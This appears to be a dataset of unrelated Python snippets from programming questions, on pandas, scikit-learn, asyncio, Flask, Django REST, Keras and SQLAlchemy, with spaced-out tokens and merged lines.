"from sklearn.preprocessing import OneHotEncoderfrom sklearn.pipeline import Pipelinesteps = [ ( 'OneHotEncoder ' , OneHotEncoder ( handle_unknown ='ignore ' ) ) , ( 'LReg ' , LinearRegression ( ) ) ] pipeline = Pipeline ( steps ) import pandas as pddf = pd.DataFrame ( { 'Country ' : [ 'USA ' , 'USA ' , 'IND ' , 'UK ' , 'UK ' , 'UK ' ] , 'Fruits ' : [ 'Apple ' , 'Strawberry ' , 'Mango ' , 'Berries ' , 'Banana ' , 'Grape ' ] , 'Flower ' : [ 'Rose ' , 'Lily ' , 'Orchid ' , 'Petunia ' , 'Lotus ' , 'Dandelion ' ] , 'Result ' : [ 1,2,3,4,5,6 , ] } ) from sklearn.preprocessing import OneHotEncoderfrom sklearn.linear_model import LinearRegressionfrom sklearn.pipeline import Pipelinesteps = [ ( 'OneHotEncoder ' , OneHotEncoder ( handle_unknown ='ignore ' ) ) , ( 'LReg ' , LinearRegression ( ) ) ] pipeline = Pipeline ( steps ) from sklearn.model_selection import train_test_splitX = df [ [ `` Country '' , '' Flower '' , '' Fruits '' ] ] Y = df [ `` Result '' ] X_train , X_test , y_train , y_test = train_test_split ( X , Y , test_size=0.3 , random_state=30 , shuffle =True ) print ( `` X_train.shape : '' , X_train.shape ) print ( `` y_train.shape : '' , y_train.shape ) print ( `` X_test.shape : '' , X_test.shape ) print ( `` y_test.shape : '' , y_test.shape ) pipeline.fit ( X_train , y_train ) y_pred = pipeline.predict ( X_test ) from sklearn.metrics import mean_squared_errorfrom sklearn.metrics import r2_score # Mean Squared Error : MSE = mean_squared_error ( y_test , y_pred ) print ( `` MSE '' , MSE ) # Root Mean Squared Error : from math import sqrtRMSE = sqrt ( MSE ) print ( `` RMSE '' , RMSE ) # R-squared score : R2_score = r2_score ( y_test , y_pred ) print ( `` R2_score '' , R2_score )"
"# merge exampledf = pd.DataFrame ( { 'col1 ' : [ np.nan , 'match ' ] , 'col2 ' : [ 1,2 ] } ) df2 = pd.DataFrame ( { 'col1 ' : [ np.nan , 'no match ' ] , 'col3 ' : [ 3,4 ] } ) pd.merge ( df , df2 , on='col1 ' ) col1 col2 col30 NaN 1 3 # join example with same dataframes from abovedf.set_index ( 'col1 ' ) .join ( df2.set_index ( 'col1 ' ) ) col2 col3col1 NaN 1 3.0match 2 NaN df = pd.DataFrame ( { 'col1 ' : [ np.nan , 'match ' , np.nan ] , 'col2 ' : [ 1,2,1 ] } ) df.groupby ( 'col1 ' ) .sum ( ) col2col1 match 2"
"pattern = re.compile ( `` < . * ? > | & nbsp ; | & amp ; '' , re.DOTALL|re.M ) pattern = re.compile ( `` < . * ? > | & nbsp ; | & amp ; |\u260e '' , re.DOTALL|re.M ) pattern = re.compile ( `` < . * ? > | & nbsp ; | & amp ; |\\u260e '' , re.DOTALL|re.M ) pattern = re.compile ( `` < . * ? > | & nbsp ; | & amp ; |\\\\u260e '' , re.DOTALL|re.M )"
"def init ( self ) : a = numpy.arange ( 0 , self.max_i , 1 ) self.vibr_energy = self.calculate_vibr_energy ( a ) def calculate_vibr_energy ( i ) : return numpy.exp ( -self.harmonic * i - self.anharmonic * ( i ** 2 ) ) myclass.calculate_vibr_energy ( 1 ) tmp = np.array ( [ 1 ] ) myclass.calculate_vibr_energy ( tmp ) [ 0 ]"
"def gen1 ( ) : # just for examples , yield 1 # yields actually carry yield 2 # different computation weight yield 3 # in my casedef gen2 ( ) : yield 4 yield 5 yield 6 from itertools import chainmix = chain ( gen1 ( ) , gen2 ( ) ) def mix_yield ( ) : for item in mix : yield item import asynciofrom aiostream import streamasync def gen1 ( ) : await asyncio.sleep ( 0 ) yield 1 await asyncio.sleep ( 0 ) yield 2 await asyncio.sleep ( 0 ) yield 3 async def gen2 ( ) : await asyncio.sleep ( 0 ) yield 4 await asyncio.sleep ( 0 ) yield 5 await asyncio.sleep ( 0 ) yield 6 a_mix = stream.combine.merge ( gen1 ( ) , gen2 ( ) ) async def a_mix_yield ( ) : for item in a_mix : yield item TypeError : 'merge ' object is not an iterator raise StreamEmpty ( ) print ( await stream.list ( a_mix ) ) # [ 1 , 2 , 4 , 3 , 5 , 6 ]"
"from flask import got_request_exception , requestdef log_exception ( sender , exception , **extra ) : logger.info ( `` URL : { } , Exception : { } '' .format ( request.url , type ( exception ) .__name__ ) ) got_request_exception.connect ( log_exception , app ) from flask import requestimport flask_restfulclass SomeResource ( flask_restful.Resource ) : def get ( self ) : # ... GET processing def log_data ( self ) : # log all body params return request.get_json ( ) class Login ( flask_restful.Resource ) : def post ( self ) : # ... authentication def log_data ( self ) : # log selected body params return { 'login ' : request.get_json ( ) [ 'login ' ] , 'password ' : 'HIDDEN ! ' } from flask import got_request_exception , requestdef log_exception ( sender , exception , **extra ) : resource_class = # THIS IS THE THING I 'M MISSING logger.info ( `` URL : { } , Exception : { } , Data : { } '' .format ( request.url , type ( exception ) .__name__ ) , resource_class.log_data ( ) ) got_request_exception.connect ( log_exception , app )"
"def obtenerPDFNuevoPedido ( self , handler , rsUsuarioPedido , rsPedido ) : handler.response.headers [ 'Content-Type ' ] = 'application/pdf ' handler.response.headers [ 'Content-Disposition ' ] = 'attachment ; filename=output.pdf ' story = [ ] story.append ( Paragraph ( 'CHIPAS ' , ParagraphStyle ( name= '' centeredStyle '' , alignment=TA_CENTER , fontSize=20 ) ) ) story.append ( Paragraph ( '____________ENLANUBE ' , ParagraphStyle ( name= '' centeredStyle '' , alignment=TA_CENTER , fontSize=20 ) ) ) story.append ( Spacer ( 6 , 22 ) ) story.append ( Table ( [ [ Paragraph ( str ( strftime ( `` % Y- % m- % d '' , gmtime ( ) ) ) , ParagraphStyle ( name= '' centeredStyle '' , alignment=TA_LEFT , fontSize=7 ) ) , Paragraph ( str ( strftime ( `` % H : % M : % S '' , gmtime ( ) ) ) , ParagraphStyle ( name= '' centeredStyle '' , alignment=TA_RIGHT , fontSize=7 ) ) ] ] , colWidths= [ 5.05 * cm , 3.1 * cm ] ) ) story.append ( Paragraph ( `` DEVELOPED AT ROSHKA-LABS '' , ParagraphStyle ( name= '' centeredStyle '' , alignment=TA_CENTER , fontSize=6 ) ) ) story.append ( Paragraph ( '-'*50 , styleCentered ) ) # ... # ... doc = SimpleDocTemplate ( handler.response.out , pagesize=letter ) doc.build ( story )"
"import multiprocessingclass AdderProcess ( multiprocessing.Process ) : def __init__ ( self ) : multiprocessing.Process.__init__ ( self ) self.sum = 0 self.queue = multiprocessing.JoinableQueue ( 5 ) self.daemon = True self.start ( ) def run ( self ) : while True : number = self.queue.get ( ) self.sum += number self.queue.task_done ( ) def add ( self , number ) : self.queue.put ( number ) def get_result ( self ) : self.queue.join ( ) return self.sump = AdderProcess ( ) p.add ( 1 ) p.add ( 1 ) print p.get_result ( ) import multiprocessingclass AdderProcess ( multiprocessing.Process ) : def __init__ ( self ) : multiprocessing.Process.__init__ ( self ) self.sum = multiprocessing.Value ( 'd ' , 0.0 ) self.queue = multiprocessing.JoinableQueue ( 5 ) self.daemon = True self.start ( ) def run ( self ) : while True : number = self.queue.get ( ) self.sum.value += number self.queue.task_done ( ) def add ( self , number ) : self.queue.put ( number ) def get_result ( self ) : self.queue.join ( ) return self.sum.valuep = AdderProcess ( ) p.add ( 1 ) p.add ( 1 ) print p.get_result ( )"
"a = 3b = 5current = 0distToA = adistToB = bfor i in xrange ( 100 ) : if distToA > distToB : # B comes first print `` Adding { 0 } '' .format ( distToB ) current += distToB distToA -= distToBb distToB = b elif distToB > distToA : # A comes first print `` Adding { 0 } '' .format ( distToA ) current += distToA distToB -= distToA distToA = a else : # Equal print `` Adding { 0 } '' .format ( distToA ) current += distToA # Arbitrarily , could be distToB distToA = a distToB = b"
"from collections import defaultdictd = defaultdict ( int ) res = d [ 5 ] print ( d ) # defaultdict ( < class 'int ' > , { 5 : 0 } ) # we want this dictionary to remain empty d [ 8 ] = 1 # we want this key addedd [ 3 ] += 1 # we want this key added from collections import Counterc = Counter ( ) res = c [ 5 ] # 0print ( c ) # Counter ( ) c [ 8 ] = 1 # key added successfullyc [ 3 ] += 1 # key added successfully % timeit DwD ( lst ) # 72 ms % timeit dd ( lst ) # 44 ms % timeit counter_func ( lst ) # 98 ms % timeit af ( lst ) # 72 ms import numpy as npfrom collections import defaultdict , Counter , UserDictclass DefaultDict ( defaultdict ) : def get_and_forget ( self , key ) : _sentinel = object ( ) value = self.get ( key , _sentinel ) if value is _sentinel : return self.default_factory ( ) return valueclass DictWithDefaults ( dict ) : __slots__ = [ '_factory ' ] # avoid using extra memory def __init__ ( self , factory , *args , **kwargs ) : self._factory = factory super ( ) .__init__ ( *args , **kwargs ) def __missing__ ( self , key ) : return self._factory ( ) lst = np.random.randint ( 0 , 10 , 100000 ) def DwD ( lst ) : d = DictWithDefaults ( int ) for i in lst : d [ i ] += 1 return ddef dd ( lst ) : d = defaultdict ( int ) for i in lst : d [ i ] += 1 return ddef counter_func ( lst ) : d = Counter ( ) for i in lst : d [ i ] += 1 return ddef af ( lst ) : d = DefaultDict ( int ) for i in lst : d [ i ] += 1 return d"
"d = [ l for l in open ( ' a.txt ' , ' r ' ) ]"
"M [ [ [ [ 4 , 1 ] , [ 2 , 1 ] ] , [ [ 8 , 2 ] , [ 4 , 2 ] ] ] , [ [ [ 8 , 2 ] , [ 4 , 2 ] ] , [ [ 12 , 3 ] , [ 6 , 3 ] ] ] ] [ [ 32 , 8 ] , [ 16 , 8 ] ]"
"def _time_independent_equals ( a , b ) : if len ( a ) ! = len ( b ) : return False result = 0 for x , y in zip ( a , b ) : result |= ord ( x ) ^ ord ( y ) return result == 0"
"model = Sequential ( ) model.add ( LSTM ( 32 , activation='sigmoid ' , input_shape= ( x_train.shape [ 1 ] , x_train.shape [ 2 ] ) ) ) model.add ( Dense ( y_train.shape [ 1 ] ) ) model.compile ( optimizer='adam ' , loss='mse ' ) es = EarlyStopping ( monitor='val_loss ' , patience=3 , restore_best_weights=True ) model.fit ( x_train , y_train , batch_size=64 , epochs=25 , validation_data= ( x_test , y_test ) , callbacks= [ es ] ) Train on 396 samples , validate on 1 samplesEpoch 1/25396/396 [ ============================== ] - 1s 2ms/step - loss : 0.1322 - val_loss : 0.0299Epoch 2/25396/396 [ ============================== ] - 0s 402us/step - loss : 0.0478 - val_loss : 0.0129Epoch 3/25396/396 [ ============================== ] - 0s 397us/step - loss : 0.0385 - val_loss : 0.0178Epoch 4/25396/396 [ ============================== ] - 0s 399us/step - loss : 0.0398 - val_loss : 0.0078Epoch 5/25396/396 [ ============================== ] - 0s 391us/step - loss : 0.0343 - val_loss : 0.0030Epoch 6/25396/396 [ ============================== ] - 0s 391us/step - loss : 0.0318 - val_loss : 0.0047Epoch 7/25396/396 [ ============================== ] - 0s 389us/step - loss : 0.0308 - val_loss : 0.0043Epoch 8/25396/396 [ ============================== ] - 0s 393us/step - loss : 0.0292 - val_loss : 0.0056 `` '' '' python 3.7.7tensorflow 2.1.0keras 2.3.1 '' '' '' import numpy as npimport pandas as pdfrom keras.callbacks import EarlyStopping , Callbackfrom keras.models import Model , Sequential , load_modelfrom keras.layers import Dense , Dropout , LSTM , BatchNormalizationfrom sklearn.preprocessing import MinMaxScalerimport plotly.graph_objects as goimport yfinance as yfnp.random.seed ( 4 ) num_prediction = 5look_back = 90new_s_h5 = True # change it to False when you created model and want test on other past datesdf = yf.download ( tickers= '' ^GSPC '' , start='2018-05-06 ' , end='2020-04-24 ' , interval= '' 1d '' ) data = df.filter ( [ 'Close ' , 'High ' , 'Low ' , 'Volume ' ] ) # drop last N days to validate saved model on pastdf.drop ( df.tail ( 0 ) .index , inplace=True ) print ( df ) class EarlyStoppingCust ( Callback ) : def __init__ ( self , patience=0 , verbose=0 , validation_sets=None , restore_best_weights=False ) : super ( EarlyStoppingCust , self ) .__init__ ( ) self.patience = patience self.verbose = verbose self.wait = 0 self.stopped_epoch = 0 self.restore_best_weights = restore_best_weights self.best_weights = None self.validation_sets = validation_sets def on_train_begin ( self , logs=None ) : self.wait = 0 self.stopped_epoch = 0 self.best_avg_loss = ( np.Inf , 0 ) def on_epoch_end ( self , epoch , logs=None ) : loss_ = 0 for i , validation_set in enumerate ( self.validation_sets ) : predicted = self.model.predict ( validation_set [ 0 ] ) loss = self.model.evaluate ( validation_set [ 0 ] , validation_set [ 1 ] , verbose = 0 ) loss_ += loss if self.verbose > 0 : print ( 'val ' + str ( i + 1 ) + '_loss : % .5f ' % loss ) avg_loss = loss_ / len ( self.validation_sets ) print ( 'avg_loss : % .5f ' % avg_loss ) if self.best_avg_loss [ 0 ] > avg_loss : self.best_avg_loss = ( avg_loss , epoch + 1 ) self.wait = 0 if self.restore_best_weights : print ( 'new best epoch = % d ' % ( epoch + 1 ) ) self.best_weights = self.model.get_weights ( ) else : self.wait += 1 if self.wait > = self.patience or self.params [ 'epochs ' ] == epoch + 1 : self.stopped_epoch = epoch self.model.stop_training = True if self.restore_best_weights : if self.verbose > 0 : print ( 'Restoring model weights from the end of the best epoch ' ) self.model.set_weights ( self.best_weights ) def on_train_end ( self , logs=None ) : print ( 'best_avg_loss : % .5f ( # % d ) ' % ( self.best_avg_loss [ 0 ] , self.best_avg_loss [ 1 ] ) ) def multivariate_data ( dataset , target , start_index , end_index , history_size , target_size , step , single_step=False ) : data = [ ] labels = [ ] start_index = start_index + history_size if end_index is None : end_index = len ( dataset ) - target_size for i in range ( start_index , end_index ) : indices = range ( i-history_size , i , step ) data.append ( dataset [ indices ] ) if single_step : labels.append ( target [ i+target_size ] ) else : labels.append ( target [ i : i+target_size ] ) return np.array ( data ) , np.array ( labels ) def transform_predicted ( pr ) : pr = pr.reshape ( pr.shape [ 1 ] , -1 ) z = np.zeros ( ( pr.shape [ 0 ] , x_train.shape [ 2 ] - 1 ) , dtype=pr.dtype ) pr = np.append ( pr , z , axis=1 ) pr = scaler.inverse_transform ( pr ) pr = pr [ : , 0 ] return prstep = 1 # creating datasets with look backscaler = MinMaxScaler ( ) df_normalized = scaler.fit_transform ( df.values ) dataset = df_normalized [ : -num_prediction ] x_train , y_train = multivariate_data ( dataset , dataset [ : , 0 ] , 0 , len ( dataset ) - num_prediction + 1 , look_back , num_prediction , step ) indices = range ( len ( dataset ) -look_back , len ( dataset ) , step ) x_test = np.array ( dataset [ indices ] ) x_test = np.expand_dims ( x_test , axis=0 ) y_test = np.expand_dims ( df_normalized [ -num_prediction : , 0 ] , axis=0 ) # creating past datasets to validate with EarlyStoppingCustnumber_validates = 50step_past = 5validation_sets = [ ( x_test , y_test ) ] for i in range ( 1 , number_validates * step_past + 1 , step_past ) : indices = range ( len ( dataset ) -look_back-i , len ( dataset ) -i , step ) x_t = np.array ( dataset [ indices ] ) x_t = np.expand_dims ( x_t , axis=0 ) y_t = np.expand_dims ( df_normalized [ -num_prediction-i : len ( df_normalized ) -i , 0 ] , axis=0 ) validation_sets.append ( ( x_t , y_t ) ) if new_s_h5 : model = Sequential ( ) model.add ( LSTM ( 32 , return_sequences=False , activation = 'sigmoid ' , input_shape= ( x_train.shape [ 1 ] , x_train.shape [ 2 ] ) ) ) # model.add ( Dropout ( 0.2 ) ) # model.add ( BatchNormalization ( ) ) # model.add ( LSTM ( units = 16 ) ) model.add ( Dense ( y_train.shape [ 1 ] ) ) model.compile ( optimizer = 'adam ' , loss = 'mse ' ) # EarlyStoppingCust is custom callback to validate each validation_sets and get average # it takes epoch with best `` best_avg '' value # es = EarlyStoppingCust ( patience = 3 , restore_best_weights = True , validation_sets = validation_sets , verbose = 1 ) # or there is keras extension with built-in EarlyStopping , but it validates only 1 set that you pass through fit ( ) es = EarlyStopping ( monitor = 'val_loss ' , patience = 3 , restore_best_weights = True ) model.fit ( x_train , y_train , batch_size = 64 , epochs = 25 , shuffle = True , validation_data = ( x_test , y_test ) , callbacks = [ es ] ) model.save ( 's.h5 ' ) else : model = load_model ( 's.h5 ' ) predicted = model.predict ( x_test ) predicted = transform_predicted ( predicted ) print ( 'predicted ' , predicted ) print ( 'real ' , df.iloc [ -num_prediction : , 0 ] .values ) print ( 'val_loss : % .5f ' % ( model.evaluate ( x_test , y_test , verbose=0 ) ) ) fig = go.Figure ( ) fig.add_trace ( go.Scatter ( x = df.index [ -60 : ] , y = df.iloc [ -60 : ,0 ] , mode='lines+markers ' , name='real ' , line=dict ( color= ' # ff9800 ' , width=1 ) ) ) fig.add_trace ( go.Scatter ( x = df.index [ -num_prediction : ] , y = predicted , mode='lines+markers ' , name='predict ' , line=dict ( color= ' # 2196f3 ' , width=1 ) ) ) fig.update_layout ( template='plotly_dark ' , hovermode= ' x ' , spikedistance=-1 , hoverlabel=dict ( font_size=16 ) ) fig.update_xaxes ( showspikes=True ) fig.update_yaxes ( showspikes=True ) fig.show ( )"
"# django imports from bokeh.embed import componentsfrom bokeh.plotting import figurefrom bokeh.io import vformfrom bokeh.models.widgets import Selectdef test ( request ) : s = Select ( title= '' test '' , value= '' a '' , options= [ ' a ' , ' b ' , ' c ' ] ) script , div = components ( s ) return render ( request , 'test.html ' , RequestContext ( request , { 'script ' : script , 'div ' : div } ) ) < html > < head > < link href= '' http : //cdn.bokeh.org/bokeh/release/bokeh-0.11.1.min.css '' rel= '' stylesheet '' type= '' text/css '' > < script src= '' http : //cdn.bokeh.org/bokeh/release/bokeh-0.11.1.min.js '' > < /script > < /head > { % load staticfiles % } < body > { { div | safe } } { { script | safe } } < /body > < /html >"
"from scipy import optimize # minimize f ( x ) = x^2 - 4xdef f ( x ) : return x**2 - 4*xdef x_constraint ( x , sign , value ) : return sign* ( x - value ) # subject to x > = 5 and x < =0 ( not possible ) constraints = [ ] constraints.append ( { 'type ' : 'ineq ' , 'fun ' : x_constraint , 'args ' : [ 1 , 5 ] } ) constraints.append ( { 'type ' : 'ineq ' , 'fun ' : x_constraint , 'args ' : [ -1 , 0 ] } ) optimize.minimize ( f , x0=3 , constraints=constraints ) fun : -3.0 jac : array ( [ 2 . ] ) message : 'Optimization terminated successfully . ' nfev : 3 nit : 5 njev : 1 status : 0 success : True x : array ( [ 3 . ] )"
< gae-sdk > \endpointscfg.py get_client_lib java helloworld_api.HelloWorldApi
"# ! /usr/bin/env pythonimport serial # Used to communicate with pressure controllerimport loggingimport timefrom time import gmtime , strftimelogging.basicConfig ( filename= '' open_files_test.log '' ) # Write unusual + significant events to logfile + stdoutdef log ( message ) : time = strftime ( `` % Y- % m- % d % H : % M : % S '' , gmtime ( ) ) logging.warning ( time + `` `` + message ) print ( message ) for i in range ( 2000 ) : for n in range ( 1 , 12 ) : try : port_name = `` /dev/tty '' + str ( n+20 ) com = serial.Serial ( port_name,9600 , serial.EIGHTBITS , serial.PARITY_NONE , serial.STOPBITS_ONE,0.0 , False , False,5.0 , False , None ) com.open ( ) com.flushInput ( ) com.flushOutput ( ) log ( `` Opened port : `` + port_name ) except serial.SerialException : com = None log ( `` could not open serial port : `` + port_name ) com.close ( ) log ( `` Closed port : `` + port_name ) time.sleep ( 1 ) log ( `` Finished Program '' )"
"from rest_framework import permissionsclass BlacklistPermission ( permissions.BasePermission ) : '' '' '' Global permission check for blacklisted IPs . '' '' '' def has_permission ( self , request , view ) : ip_addr = request.META [ 'REMOTE_ADDR ' ] blacklisted = Blacklist.objects.filter ( ip_addr=ip_addr ) .exists ( ) return not blacklisted"
"def __init__ ( self , *args , **kwargs ) : # Do n't pass the 'fields ' arg up to the superclass fields = kwargs.pop ( 'fields ' , None ) # Instantiate the superclass normally super ( ChHiveLevel1Serializer , self ) .__init__ ( *args , **kwargs ) if fields is not None : # Drop fields that are specified in the ` fields ` argument . for field_name in fields : self.fields.pop ( field_name ) print ( `` fields to be included : `` , self.fields ) hives = profile.hive_subscriptions # En fields se le pasa el campo a eliminar del serializador fields = ( 'priority ' , ) serializer = serializers.ChHiveLevel1Serializer ( hives , fields=fields , many=True ) ... Internal Server Error : /profiles/diegoocampo8/hives/ Traceback ( most recent call last ) : File `` /home/diego/virtualenvs/chattyhive3.3.4/lib/python3.3/site-packages/django/core/handlers/base.py '' , line 111 , in get_response response = wrapped_callback ( request , *callback_args , **callback_kwargs ) File `` /home/diego/virtualenvs/chattyhive3.3.4/lib/python3.3/site-packages/django/views/decorators/csrf.py '' , line 57 , in wrapped_view return view_func ( *args , **kwargs ) File `` /home/diego/virtualenvs/chattyhive3.3.4/lib/python3.3/site-packages/django/views/generic/base.py '' , line 69 , in view return self.dispatch ( request , *args , **kwargs ) File `` /home/diego/virtualenvs/chattyhive3.3.4/lib/python3.3/site-packages/rest_framework/views.py '' , line 452 , in dispatch response = self.handle_exception ( exc ) File `` /home/diego/virtualenvs/chattyhive3.3.4/lib/python3.3/site-packages/rest_framework/views.py '' , line 449 , in dispatch response = handler ( request , *args , **kwargs ) File `` /home/diego/PycharmProjects/chattyhive/API/views.py '' , line 271 , in get serializer = serializers.ChHiveLevel1Serializer ( hives , fields=fields , many=True ) File `` /home/diego/virtualenvs/chattyhive3.3.4/lib/python3.3/site-packages/rest_framework/serializers.py '' , line 96 , in __new__ return cls.many_init ( *args , **kwargs ) File `` /home/diego/virtualenvs/chattyhive3.3.4/lib/python3.3/site-packages/rest_framework/serializers.py '' , line 116 , in many_init child_serializer = cls ( *args , **kwargs ) File `` /home/diego/PycharmProjects/chattyhive/API/serializers.py '' , line 274 , in __init__ print ( `` fields to be included : `` , self.fields ) File `` /home/diego/virtualenvs/chattyhive3.3.4/lib/python3.3/site-packages/rest_framework/utils/serializer_helpers.py '' , line 120 , in __repr__ return dict.__repr__ ( self.fields ) File `` /home/diego/virtualenvs/chattyhive3.3.4/lib/python3.3/site-packages/rest_framework/serializers.py '' , line 611 , in __repr__ return unicode_to_repr ( representation.list_repr ( self , indent=1 ) ) File `` /home/diego/virtualenvs/chattyhive3.3.4/lib/python3.3/site-packages/rest_framework/utils/representation.py '' , line 97 , in list_repr if hasattr ( child , 'fields ' ) : File `` /home/diego/virtualenvs/chattyhive3.3.4/lib/python3.3/site-packages/rest_framework/serializers.py '' , line 313 , in fields for key , value in self.get_fields ( ) .items ( ) : File `` /home/diego/virtualenvs/chattyhive3.3.4/lib/python3.3/site-packages/rest_framework/serializers.py '' , line 837 , in get_fields field_names = self.get_field_names ( declared_fields , info ) File `` /home/diego/virtualenvs/chattyhive3.3.4/lib/python3.3/site-packages/rest_framework/serializers.py '' , line 889 , in get_field_names type ( fields ) .__name__ TypeError : The ` fields ` option must be a list or tuple . Got str . [ 05/May/2015 17:30:34 ] `` GET /profiles/diegoocampo8/hives/ HTTP/1.1 '' 500 136024 class ChHiveLevel1Serializer ( serializers.ModelSerializer ) : `` '' '' Used by the following API methods : GET hive list , `` '' '' category = serializers.SlugRelatedField ( read_only=True , slug_field='code ' ) languages = serializers.SlugRelatedField ( source='_languages ' , many=True , read_only=True , slug_field='language ' ) # If in the POST we only need to establish the relationship with User model ( not update the model itself ) we # set read_only to True creator = serializers.SlugRelatedField ( read_only=True , slug_field='public_name ' ) tags = serializers.SlugRelatedField ( many=True , read_only=True , slug_field='tag ' ) public_chat = ChPublicChatLevel1Serializer ( many=False , read_only=True ) community_public_chats = ChCommunityPublicChatLevel1Serializer ( many=True , read_only=True ) subscribed_users_count = serializers.IntegerField ( source='get_subscribed_users_count ' , read_only=True ) def __init__ ( self , *args , **kwargs ) : # Do n't pass the 'fields ' arg up to the superclass fields = kwargs.pop ( 'fields ' , None ) # Instantiate the superclass normally super ( ChHiveLevel1Serializer , self ) .__init__ ( *args , **kwargs ) if fields is not None : # Drop fields that are specified in the ` fields ` argument . for field_name in fields : self.fields.pop ( field_name ) print ( `` fields to be included : `` , self.fields ) class Meta : model = ChHive fields = ( 'name ' , 'slug ' , 'description ' , 'category ' , 'languages ' , 'creator ' , 'creation_date ' , 'tags ' , 'priority ' , 'type ' , 'public_chat ' , 'community_public_chats ' , 'subscribed_users_count ' )"
RuntimeError : Value is not callable ( not TYPE_CODE_FUNC )
"df = pd.DataFrame ( { ' 1-sensor ' : [ '608 ' , '608 ' , '2158 ' , '2158 ' ] , ' 2-day ' : [ '2017-12-11 ' , '2017-12-12 ' , '2017-12-11 ' , '2017-12-12 ' ] , ' 3-voltage ' : [ 30 , 31 , 28 , 29 ] } ) 1-sensor 2-day 3-voltage0 608 2017-12-11 301 608 2017-12-12 312 2158 2017-12-11 283 2158 2017-12-12 29 pd.DataFrame ( { ' 1-sensor ' : [ '608 ' , '2158 ' ] , '2017-12-11 ' : [ 30 , 28 ] , '2017-12-12 ' : [ 31 , 29 ] } ) 1-sensor 2017-12-11 2017-12-120 608 30 311 2158 28 29"
> python manage.py runserver 8000 > ssh -i mykey.pem ec2-user @ myRandomEC2.com -L 6379 : localhost:6379
"import stringimport numpy as npimport pandas as pdfrom random import randintimport randomdef make_random_str_array ( size=10 , num_rows=100 , chars=string.ascii_uppercase + string.digits ) : return ( np.random.choice ( list ( chars ) , num_rows*size ) .view ( '|U { } '.format ( size ) ) ) def alt ( size , num_rows ) : data = make_random_str_array ( size , num_rows=2*num_rows ) .reshape ( -1 , 2 ) dfAll = pd.DataFrame ( data ) return dfAlldfAll = alt ( randint ( 1000 , 2000 ) , 10000 ) for i in range ( 330 ) : print ( 'step ' , i ) data = alt ( randint ( 1000 , 2000 ) , 10000 ) df = pd.DataFrame ( data ) dfAll = pd.concat ( [ df , dfAll ] ) import sqlalchemyfrom sqlalchemy import create_engineengine = sqlalchemy.create_engine ( 'sqlite : ///testtt.db ' ) for i in range ( 500 ) : print ( 'step ' , i ) dfAll.iloc [ ( i % 330 ) *10000 : ( ( i % 330 ) +1 ) *10000 ] .to_sql ( 'test_table22 ' , engine , index = False , if_exists= 'append ' )"
"import asynciofrom tqdm import tqdmimport uvloop as uvloopfrom aiohttp import ClientSession , TCPConnector , BasicAuth # You can ignore this classclass DummyDataHandler ( DataHandler ) : `` '' '' Takes data and stores it somewhere '' '' '' def __init__ ( self , *args , **kwargs ) : super ( ) .__init__ ( *args , **kwargs ) def take ( self , origin_url , data ) : return True def done ( self ) : return Noneclass AsyncDownloader ( object ) : def __init__ ( self , concurrent_connections=100 , silent=False , data_handler=None , loop_policy=None ) : self.concurrent_connections = concurrent_connections self.silent = silent self.data_handler = data_handler or DummyDataHandler ( ) self.sending_bar = None self.receiving_bar = None asyncio.set_event_loop_policy ( loop_policy or uvloop.EventLoopPolicy ( ) ) self.loop = asyncio.get_event_loop ( ) self.semaphore = asyncio.Semaphore ( concurrent_connections ) async def fetch ( self , session , url ) : # This is option 1 : The semaphore , limiting the number of concurrent coros , # thereby limiting the number of concurrent requests . with ( await self.semaphore ) : async with session.get ( url ) as response : # Bonus Question 1 : What is the best way to retry a request that failed ? resp_task = asyncio.ensure_future ( response.read ( ) ) self.sending_bar.update ( 1 ) resp = await resp_task await response.release ( ) if not self.silent : self.receiving_bar.update ( 1 ) return resp async def batch_download ( self , urls , auth=None ) : # This is option 2 : Limiting the number of open connections directly via the TCPConnector conn = TCPConnector ( limit=self.concurrent_connections , keepalive_timeout=60 ) async with ClientSession ( connector=conn , auth=auth ) as session : await asyncio.gather ( * [ asyncio.ensure_future ( self.download_and_save ( session , url ) ) for url in urls ] ) async def download_and_save ( self , session , url ) : content_task = asyncio.ensure_future ( self.fetch ( session , url ) ) content = await content_task # Bonus Question 2 : This is blocking , I know . Should this be wrapped in another coro # or should I use something like asyncio.as_completed in the download function ? self.data_handler.take ( origin_url=url , data=content ) def download ( self , urls , auth=None ) : if isinstance ( auth , tuple ) : auth = BasicAuth ( *auth ) print ( 'Running on concurrency level { } '.format ( self.concurrent_connections ) ) self.sending_bar = tqdm ( urls , total=len ( urls ) , desc='Sent ' , unit='requests ' ) self.sending_bar.update ( 0 ) self.receiving_bar = tqdm ( urls , total=len ( urls ) , desc='Reveived ' , unit='requests ' ) self.receiving_bar.update ( 0 ) tasks = self.batch_download ( urls , auth ) self.loop.run_until_complete ( tasks ) return self.data_handler.done ( ) # # # call like so # # # URL_PATTERN = 'https : //www.example.com/ { } .html'def gen_url ( lower=0 , upper=None ) : for i in range ( lower , upper ) : yield URL_PATTERN.format ( i ) ad = AsyncDownloader ( concurrent_connections=30 ) data = ad.download ( [ g for g in gen_url ( upper=1000 ) ] )"
"@ contextmanagerdef thread_local_session_scope ( ) : `` '' '' Provides a transactional scope around a series of operations . Context is local to current thread. `` '' '' # See this StackOverflow answer for details : # http : //stackoverflow.com/a/18265238/1830334 Session = scoped_session ( session_factory ) threaded_session = Session ( ) try : yield threaded_session threaded_session.commit ( ) except : threaded_session.rollback ( ) raise finally : Session.remove ( ) @ contextmanagerdef session_scope ( ) : `` '' '' Provides a transactional scope around a series of operations . Context is HTTP request thread using Flask-SQLAlchemy. `` '' '' try : yield db.session db.session.commit ( ) except Exception as e : print 'Rolling back database ' print e db.session.rollback ( ) # Flask-SQLAlchemy handles closing the session after the HTTP request . def build_report ( tag ) : report = _save_report ( Report ( ) ) thread = Thread ( target=_build_report , args= ( report.id , ) ) thread.daemon = True thread.start ( ) return report.id # This executes in the main thread.def _save_report ( report ) : with session_scope ( ) as session : session.add ( report ) session.commit ( ) return report # These executes in a separate thread.def _build_report ( report_id ) : with thread_local_session_scope ( ) as session : report = do_some_stuff ( report_id ) session.merge ( report ) app.config [ 'SQLALCHEMY_DATABASE_URI ' ] = 'mysql : // < username > : < password > @ < server > :3306/ < db > ? charset=utf8'app.config [ 'SQLALCHEMY_POOL_RECYCLE ' ] = 3600app.config [ 'SQLALCHEMY_TRACK_MODIFICATIONS ' ] = False"
